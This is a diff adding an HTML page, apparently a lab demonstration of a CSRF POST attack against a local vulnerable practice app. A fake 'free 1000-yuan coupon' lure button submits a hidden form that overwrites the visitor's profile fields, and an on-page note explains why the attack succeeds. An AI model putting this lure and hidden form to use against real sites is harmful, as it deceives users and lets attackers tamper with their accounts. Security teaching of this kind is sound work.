@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>钓鱼网站 - CSRF POST攻击演示</title>
+    <meta charset="utf-8">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            border: 1px solid #ddd;
+            padding: 20px;
+            border-radius: 5px;
+        }
+        h1 {
+            color: #333;
+        }
+        .hidden {
+            display: none;
+        }
+        .btn {
+            background-color: #4CAF50;
+            border: none;
+            color: white;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 10px 2px;
+            cursor: pointer;
+            border-radius: 4px;
+        }
+        .info {
+            background-color: #f8f9fa;
+            border-left: 4px solid #5bc0de;
+            padding: 10px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>免费领取价值1000元优惠券！</h1>
+        <p>感谢您访问我们的网站。作为新用户福利，您可以免费领取价值1000元的购物优惠券！</p>
+        <p>点击下方按钮立即领取：</p>
+        
+        <button class="btn" onclick="document.getElementById('csrf-form').submit();">立即领取优惠券</button>
+        
+        <div class="info">
+            <p><strong>攻击说明：</strong>这是一个演示CSRF POST攻击的页面。当用户点击按钮时，会自动提交一个隐藏的表单，向目标网站发送POST请求，修改用户的个人信息。由于目标网站缺乏CSRF防护措施（如CSRF令牌），这种攻击会成功。</p>
+        </div>
+        
+        <!-- 隐藏的表单，用于执行CSRF攻击 -->
+        <form id="csrf-form" action="http://localhost:8888/vul/csrf/csrfpost/csrf_post_edit" method="post" class="hidden">
+            <input type="hidden" name="sex" value="已被POST攻击">
+            <input type="hidden" name="phonenum" value="18888888888">
+            <input type="hidden" name="add" value="黑客组织总部">
+            <input type="hidden" name="email" value="hacked@evil.org">
+            <input type="hidden" name="submit" value="submit">
+        </form>
+    </div>
+</body>
+</html> 
